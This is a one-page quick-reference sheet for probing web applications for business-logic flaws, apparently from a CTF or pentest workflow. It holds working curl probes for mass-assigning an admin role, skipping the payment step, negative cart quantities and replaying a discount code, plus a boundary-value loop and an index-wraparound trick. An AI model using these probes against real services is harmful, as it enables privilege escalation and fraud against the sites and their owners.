# Quick reference — business-logic flaw, one page

## The shape

The implemented state machine permits an edge the imagined workflow
doesn't: a skipped step, a replayed action, a forbidden value, a field
the form never sent, a transformed index the checker never saw.

## First probes (in order)

```bash
# 1 — mass assignment
curl -X POST $BASE/register -H "Content-Type: application/json" \
  -d '{"username":"p","password":"x","role":"admin"}'
curl -b "$JAR" $BASE/api/user/p | jq .role        # admin=confirm, user=falsifier

# 2 — workflow skip
curl -i -b "$JAR" -X POST $BASE/confirm -d 'orderId=1'
curl -b "$JAR" $BASE/order/1                      # confirmed+unpaid=confirm

# 3 — numeric boundary
curl -b "$JAR" -X POST $BASE/cart -d 'productId=2&quantity=-1'
curl -b "$JAR" $BASE/cart                         # negative total=confirm

# 4 — state replay
curl -b "$JAR" -X POST $BASE/redeem -d 'code=SAVE50'   # twice
curl -b "$JAR" $BASE/balance                          # +50 twice=confirm

# 5 — boundary alphabet per numeric field
for v in -1 0 -0 0.1 1e309 NaN Infinity 2147483648 0x10 '""'; do
  curl -s -b "$JAR" -X POST $BASE/cart -d "productId=2&quantity=$v" | head -1
done
```

## Falsifiers (fire early, record, move)

| Shape | Kill shot |
|---|---|
| mass assignment | `role: user` on read-back after `role=admin` |
| workflow skip | `302/400` to the required earlier step |
| replay | `409` on the second POST |
| boundary | `400`/clamp per value |
| transform gap | out-of-limit ID rejected identically to malformed ID |

## Evidence

```bash
# baseline pair, then the manipulated request — verbatim both
python3 tools/hooks.py post-probe <ch> \
  --request "POST /register role=admin" \
  --verdict confirms --class web-logic-flaw \
  --hypothesis-id <id> --evidence-kind class \
  --evidence '"role":"admin"' --response "$(cat resp.json)"
```

## The Pachinko question

For any checked-then-transformed value: *is the value the checker bounds
the same value the sink uses?* `id` checked raw, `off + id*S mod 2^w`
used at the sink → pick `id` landing the transform on the target.

## Budget

Five probes or 15 min per mechanism; falsifiers count. Five negatives in
one mechanism → change layer via `decide.py`, never a sixth spelling.

## Routing

- role at register confirming → `web-mass-assignment` (file there)
- objectId access → `web-idor`
- serial replay blocked, parallel window open → `web-race-condition`
